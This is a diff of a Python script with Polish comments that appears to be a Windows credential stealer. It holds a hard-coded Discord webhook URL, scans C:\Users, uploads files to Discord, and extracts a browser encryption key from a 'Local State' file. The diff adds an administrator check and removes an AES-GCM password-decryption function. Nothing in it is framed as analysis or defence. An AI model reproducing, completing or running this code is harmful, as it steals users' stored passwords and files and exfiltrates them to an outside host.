@@ -10,7 +10,10 @@ webhook_url_2 = "https://discord.com/api/webhooks/1322292531374854224/Fdl-C9RgDU
 # Ścieżka do katalogu z użytkownikami
 users_directory = r"C:\Users"
 
-
+# Funkcja do sprawdzania uprawnień
+if not os.access(users_directory, os.W_OK):
+    print("Brak wymaganych uprawnień. Uruchom skrypt jako administrator.")
+    sys.exit(1)
 
 # Funkcja do wysyłania pliku na Discord
 def send_file_to_discord(file_path, webhook_url):
@@ -29,17 +32,7 @@ def send_file_to_discord(file_path, webhook_url):
         print(f"Błąd przy otwieraniu pliku {file_path}: {e}")
 
 # ODTAD NOWY KOD
-# Funkcja do odszyfrowywania haseł
-def decrypt_password(encrypted_password, key):
-    try:
-        iv = encrypted_password[3:15]
-        payload = encrypted_password[15:]
-        cipher = AES.new(key, AES.MODE_GCM, iv)
-        decrypted_password = cipher.decrypt(payload).decode('utf-8')
-        return decrypted_password
-    except Exception as e:
-        print(f"Błąd odszyfrowywania hasła: {e}")
-        return f"Błąd odszyfrowywania: {e}"
+
 
 # Funkcja do wyciągania klucza szyfrującego
 def extract_key(local_state_path):
